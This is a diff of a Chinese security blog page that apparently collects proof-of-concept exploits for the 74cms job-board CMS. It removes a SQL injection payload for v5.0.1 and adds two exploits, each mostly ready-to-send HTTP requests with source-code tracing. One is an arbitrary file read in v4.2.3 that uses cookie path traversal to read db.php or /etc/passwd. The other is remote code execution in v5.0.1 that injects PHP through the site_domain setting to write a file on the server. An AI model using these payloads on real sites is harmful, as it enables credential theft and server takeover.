+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId40.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId41.png"></p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/rymscc">https://www.yuque.com/pmiaowu/bfgkkh/rymscc</a></p>
+</blockquote>
 
       
     </div>
@@ -1277,7 +1170,7 @@ if __name__ == &#39;__main__&#39;:
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1290,7 +1183,7 @@ if __name__ == &#39;__main__&#39;:
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">74cms v5.0.1 前台sql注入</a>
+          <a href="/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="post-title-link" itemprop="url">74cms v4.2.3任意文件读取</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1302,7 +1195,7 @@ if __name__ == &#39;__main__&#39;:
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:30:06" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:28:01" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1325,18 +1218,316 @@ if __name__ == &#39;__main__&#39;:
     
     <div class="post-body" itemprop="articleBody">
           <a id="more"></a>
-<h1 id="74cms-v5-0-1-前台sql注入"><a href="#74cms-v5-0-1-前台sql注入" class="headerlink" title="74cms v5.0.1 前台sql注入"></a>74cms v5.0.1 前台sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入</p>
-<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="具体信息"><a href="#具体信息" class="headerlink" title="具体信息"></a>具体信息</h3><p>文件位置：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php</p>
-<p>方法：function company_focus($company_id)</p>
-<p>是否需登录：需要</p>
-<p>登录权限：普通用户即可</p>
-<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload:"></a>Payload:</h3><pre><code>http://0-sec.org/74cms/5.0.1/upload/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a</code></pre>
-<p><img src="/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
-<h3 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h3><p>文件：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php</p>
-<p>company_focus<br>方法是参数化函数，$company_id参数是不经过I函数过滤的，所以只要where可以控制，那就可以注入</p>
-<p><img src="/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
-<p>跟踪add_focus(),发现SQL语句参数外部都可以控制，导致了注入漏洞</p>
-<p><img src="/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
+<h1 id="74cms-v4-2-3任意文件读取"><a href="#74cms-v4-2-3任意文件读取" class="headerlink" title="74cms v4.2.3任意文件读取"></a>74cms v4.2.3任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v4.2.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>先尝试读取 db.php，向服务器post如下数据</p>
+<pre><code>POST /index.php?m=&amp;c=members&amp;a=register HTTP/1.1
+Host: www.0-sec.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku
+Content-Type: application/x-www-form-urlencoded
+
+ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind</code></pre>
+<p>会返回如下数据</p>
+<p>1.png</p>
+<p>在/data/upload/avatar/年月/日文件夹下 会生成一张图片</p>
+<p>2.png</p>
+<p>这张图片的名称由id和时间戳的md5值构成，我们可以将Burp<br>Suite上返回的时间转换为时间戳</p>
+<p>3.png</p>
+<p>不过这个时间可能会有误差，如果不行就把时间+-10</p>
+<p>我post的id为654321，获取的时间戳为1571659588，将他们连在一起进行md5加密</p>
+<p>4.png</p>
+<p>成功获取图片名，然后访问</p>
+<pre><code>https://www.0-sec.org/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg </code></pre>
+<p>保存该图片用文本打开就是 db.php 的内容。</p>
+<h6 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h6><p>使用post提交，参数如下</p>
+<p>5.png</p>
+<p>在Header可获取到时间戳</p>
+<p>6.png</p>
+<h3 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="可能会遇到的问题"></a>可能会遇到的问题</h3><h6 id="post数据返回unicode编码"><a href="#post数据返回unicode编码" class="headerlink" title="post数据返回unicode编码"></a>post数据返回unicode编码</h6><p>因为名称，密码，ID等内容格式不对或重复会出现这种情况，将unicode编码进行解码，按提示修改即可。</p>
+<h6 id="读取其他文件"><a href="#读取其他文件" class="headerlink" title="读取其他文件"></a>读取其他文件</h6><p>../../../../Application/Common/Conf/db.php</p>
+<p>是读取db.php，如果想读取根目录可以构造</p>
+<p>../../../../../../../../etc/passwd</p>
+<h6 id="时间戳问题"><a href="#时间戳问题" class="headerlink" title="时间戳问题"></a>时间戳问题</h6><p>服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/12/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" class="post-title-link" itemprop="url">74cms v5.0.1远程执行代码</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:04:16" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <a id="more"></a>
+<h1 id="74cms-v5-0-1远程执行代码"><a href="#74cms-v5-0-1远程执行代码" class="headerlink" title="74cms v5.0.1远程执行代码"></a>74cms v5.0.1远程执行代码</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v5.0.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="/images/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId25.png"></p>
+<pre><code>POST /74cms/index.php?m=Admin&amp;c=config&amp;a=edit HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/74cms/index.php?m=Admin&amp;c=Config&amp;a=index
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 391
+Connection: close
+Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
+
+site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&amp;site_domain=127.0.0.1&amp;site_dir=%2F74cms%2F&amp;top_tel=000-00000000&amp;bootom_tel=000-00000000&amp;contact_email=&amp;address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&amp;bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&amp;icp=icp000000000&amp;isclose=0&amp;close_reason=&amp;statistics=&amp;logo_home=&amp;logo_other=</code></pre>
+<p>c=config&amp;a=edit -&gt; Controller=config&amp;action=edit -&gt;<br>/Application/Admin/Controller/ConfigController.class.php Line 9:<br>I(&#39;request.site_domain&#39;,&#39;&#39;,&#39;trim&#39;) -&gt; trim($site_domain,&#39;/&#39;)<br>-&gt; &#39;.&#39;.implode(&#39;.&#39;,$domain) -&gt; array(&#39;domain&#39;=&gt;$domain) -&gt;<br>$this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;)</p>
+<pre><code>public function edit()&#123;
+       if(IS_POST)&#123;
+           $site_domain = I(&#39;request.site_domain&#39;,&#39;&#39;,&#39;trim&#39;);
+           $site_domain = trim($site_domain,&#39;/&#39;);
+           $site_dir = I(&#39;request.site_dir&#39;,C(&#39;qscms_site_dir&#39;),&#39;trim&#39;);
+           $site_dir = $site_dir==&#39;&#39;?&#39;/&#39;:$site_dir;
+           $site_dir = $site_dir==&#39;/&#39;?$site_dir:(&#39;/&#39;.trim($site_dir,&#39;/&#39;).&#39;/&#39;);
+           $_POST[&#39;site_dir&#39;] = $site_dir;
+           if($site_domain &amp;&amp; $site_domain != C(&#39;qscms_site_domain&#39;))&#123;
+               if($site_domain == C(&#39;qscms_wap_domain&#39;))&#123;
+                   $this-&gt;returnMsg(0,&#39;主域名不能与触屏版域名重复！&#39;);
+               &#125;
+               $str = str_replace(&#39;http://&#39;,&#39;&#39;,$site_domain);
+               $str = str_replace(&#39;https://&#39;,&#39;&#39;,$str);
+               if(preg_match(&#39;/com.cn|net.cn|gov.cn|org.cn$/&#39;,$str) === 1)&#123;
+                   $domain = array_slice(explode(&#39;.&#39;, $str), -3, 3);
+               &#125;else&#123;
+                   $domain = array_slice(explode(&#39;.&#39;, $str), -2, 2);
+               &#125;
+               $domain = &#39;.&#39;.implode(&#39;.&#39;,$domain);
+               $config[&#39;SESSION_OPTIONS&#39;] = array(&#39;domain&#39;=&gt;$domain);
+               $config[&#39;COOKIE_DOMAIN&#39;] = $domain;
+               $this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;);
+           &#125;</code></pre>
+<p>/ThinkPHP/Common/functions.php第271行中的I（&#39;request.site_domain&#39;，&#39;&#39;，&#39;trim&#39;）是字符串。request.site_domain-&gt;<br>$ _REQUEST [&#39;site_domain&#39;]-&gt; $ _ REQUEST<br>[&#39;site_domain&#39;]是字符串-&gt;修剪（$ _REQUEST [&#39;site_domain&#39;]）</p>
+<pre><code>function I($name,$default=&#39;&#39;,$filter=null,$datas=null) &#123;
+    ...
+    if(strpos($name,&#39;.&#39;)) &#123; // 指定参数来源
+        list($method,$name) =   explode(&#39;.&#39;,$name,2);
+    &#125;else&#123; // 默认为自动判断
+        $method =   &#39;param&#39;;
+    &#125;
+    switch(strtolower($method)) &#123;
+        case &#39;get&#39;     :   
+            $input =&amp; $_GET;
+            break;
+        case &#39;post&#39;    :   
+            $input =&amp; $_POST;
+            break;
+        ...
+        case &#39;request&#39; :   
+            $input =&amp; $_REQUEST;   
+            break;
+        ...
+    &#125;
+    if(&#39;&#39;==$name) &#123; // 获取全部变量
+      ...
+        &#125;
+    &#125;elseif(isset($input[$name])) &#123; // 取值操作
+        $data       =   $input[$name];
+        $filters = isset($filter) ? $filter.&#39;,&#39;.C(&#39;DEFAULT_FILTER&#39;) : C(&#39;DEFAULT_FILTER&#39;);
+        //$filters    =   isset($filter)?$filter:C(&#39;DEFAULT_FILTER&#39;);
+        if($filters) &#123;
+            if(is_string($filters))&#123;
+                if(0 === strpos($filters,&#39;/&#39;))&#123;
+                    if(1 !== preg_match($filters,(string)$data))&#123;
+                        // 支持正则验证
+                        return   isset($default) ? $default : null;
+                    &#125;
+                &#125;else&#123;
+                    $filters    =   explode(&#39;,&#39;,$filters);                    
+                &#125;
+            &#125;elseif(is_int($filters))&#123;
+                $filters    =   array($filters);
+            &#125;
+
+            if(is_array($filters))&#123;
+                foreach($filters as $filter)&#123;
+                    if(function_exists($filter)) &#123;
+                        $data   =   is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤
+                    &#125;else&#123;
+                        $data   =   filter_var($data,is_int($filter) ? $filter : filter_id($filter));
+                        if(false === $data) &#123;
+                            return   isset($default) ? $default : null;
+                        &#125;
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+        if(!empty($type))&#123;
+          ...
+    &#125;else&#123; // 变量默认值
+        $data       =    isset($default)?$default:null;
+    &#125;
+    is_array($data) &amp;&amp; array_walk_recursive($data,&#39;think_filter&#39;);
+    return $data;
+&#125;</code></pre>
+<p>返回到/Application/Admin/Controller/ConfigController.class.php第29行：array（&#39;SESSION_OPTIONS&#39;=&gt;<br>array（&#39;domain&#39;=&gt; $ domain），&#39;COOKIE_DOMAIN&#39;=&gt; $ domain） -&gt;<br>update_config（$ config， CONF_PATH.&#39;url.php&#39;）</p>
+<pre><code>$config[&#39;SESSION_OPTIONS&#39;] = array(&#39;domain&#39;=&gt;$domain);
+$config[&#39;COOKIE_DOMAIN&#39;] = $domain;
+$this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;);</code></pre>
+<p>/Application/Common/Controller/BackendController.class.php第467<br>行中的update_config（$ config，CONF_PATH.&#39;url.php&#39;）：</p>
+<p>multimerge（$ config，$ new_config） -&gt; file_put_contents（$<br>config_file，” &lt;？php \ nreturn”。stripslashes（var_export（$<br>config，true））。”;”，LOCK_EX）</p>
+<pre><code>    public function update_config($new_config, $config_file = &#39;&#39;) &#123;
+        !is_file($config_file) &amp;&amp; $config_file = HOME_CONFIG_PATH . &#39;config.php&#39;;
+        if (is_writable($config_file)) &#123;
+            $config = require $config_file;
+            $config = multimerge($config, $new_config);
+            if($config[&#39;SESSION_OPTIONS&#39;])&#123;
+                $config[&#39;SESSION_OPTIONS&#39;][&#39;path&#39;] = SESSION_PATH;
+            &#125;
+            file_put_contents($config_file, &quot;&lt;?php \nreturn &quot; . stripslashes(var_export($config, true)) . &quot;;&quot;, LOCK_EX);
+            @unlink(RUNTIME_FILE);
+            return true;
+        &#125; else &#123;
+            return false;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<p>multimerge($config, $new_config) in<br>/Application/Common/Common/function.php Line 938: no restricted</p>
+<pre><code>function multimerge($a, $b) &#123;
+    if (is_array($b) &amp;&amp; count($b)) &#123;
+        foreach ($b as $k =&gt; $v) &#123;
+            if (is_array($v) &amp;&amp; count($v)) &#123;
+                $a[$k] = in_array($k, array(&#39;SESSION_OPTIONS&#39;)) ? multimerge($a[$k], $v) : $v;
+            &#125; else &#123;
+                $a[$k] = $v;
+            &#125;
+        &#125;
+    &#125; else &#123;
+        $a = $b;
+    &#125;
+    return $a;
+&#125;</code></pre>
+<p>CONF_PATH in /ThinkPHP/ThinkPHP.php Line 54: CONF_PATH.&#39;url.php&#39; -&gt;<br>/Application/Common/Conf/url.php</p>
+<pre><code>defined(&#39;COMMON_PATH&#39;)  or define(&#39;COMMON_PATH&#39;,    APP_PATH.&#39;Common/&#39;); // 应用公共目录
+defined(&#39;CONF_PATH&#39;)    or define(&#39;CONF_PATH&#39;,      COMMON_PATH.&#39;Conf/&#39;);
+define(&#39;APP_PATH&#39;,&#39;./Application/&#39;);</code></pre>
+<p>var_export(): Quote string with slashes&amp;Convert special characters to<br>HTML entities -&gt; stripslashes(): un-quotes a quoted string -&gt; Convert<br>special characters to HTML entities -&gt; write file</p>
+<pre><code>file_put_contents($config_file, &quot;&lt;?php \nreturn &quot; . stripslashes(var_export($config, true)) . &quot;;&quot;,LOCK_</code></pre>
+<p>/Application/Home/Conf/url.php: The code after &quot;return array(...);&quot;<br>does not work, so payload is site_domain=&#39;, {your php code},&#39;</p>
+<pre><code>&lt;?php 
+return array (
+  &#39;URL_MODEL&#39; =&gt; 0,
+  &#39;URL_HTML_SUFFIX&#39; =&gt; &#39;.html&#39;,
+  &#39;URL_PATHINFO_DEPR&#39; =&gt; &#39;/&#39;,
+  &#39;URL_ROUTER_ON&#39; =&gt; true,
+  &#39;URL_ROUTE_RULES&#39; =&gt; 
+  array (
+    &#39;/^jobfair\/(?!admin)(\w+)$/&#39; =&gt; &#39;jobfair/index/:1&#39;,
+    &#39;/^mall\/(?!admin)(\w+)$/&#39; =&gt; &#39;mall/index/:1&#39;,
+  ),
+  &#39;QSCMS_VERSION&#39; =&gt; &#39;5.0.1&#39;,
+  &#39;QSCMS_RELEASE&#39; =&gt; &#39;2019-03-19 00:00:00&#39;,
+  &#39;SESSION_OPTIONS&#39; =&gt; 
+  array (
+    &#39;domain&#39; =&gt; &#39;.0.1&#39;,
+    0 =&gt; 18,
+    1 =&gt; &#39;&#39;,
+    &#39;path&#39; =&gt; &#39;D:\***\***\***\WWW\74cms\data\session&#39;,
+  ),
+  &#39;COOKIE_DOMAIN&#39; =&gt; &#39;.0.1&#39;,
+  0 =&gt; 18,
+  1 =&gt; &#39;&#39;,
+);</code></pre>
+<h3 id="复现poc"><a href="#复现poc" class="headerlink" title="复现poc"></a>复现poc</h3><p>-&gt; PD9waHAgcGhwaW5mbygpOz8+</p>
+<p>site_domain=&#39;,<br>file_put_contents(&#39;403.php&#39;,base64_decode(&#39;PD9waHAgcGhwaW5mbygpOz8+&#39;)),&#39;</p>
+<pre><code>POST /74cms/index.php?m=Admin&amp;c=config&amp;a=edit HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/74cms/index.php?m=Admin&amp;c=Config&amp;a=index
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 465
+Connection: close
+Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
+
+site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&amp;site_domain=&#39;%2C+file_put_contents(&#39;403.php&#39;%2Cbase64_decode(&#39;PD9waHAgcGhwaW5mbygpOz8%2B&#39;))%2C&#39;&amp;site_dir=%2F74cms%2F&amp;top_tel=000-00000000&amp;bootom_tel=000-00000000&amp;contact_email=&amp;address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&amp;bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&amp;icp=icp000000000&amp;isclose=0&amp;close_reason=&amp;statistics=&amp;logo_home=&amp;logo_other=
+GET /74cms/Application/Common/Conf/url.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0</code></pre>
+<p>成功截图</p>
+<p><img src="/images/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId27.png"></p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md">https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md</a></p>
+</blockquote>
 
       
     </div>
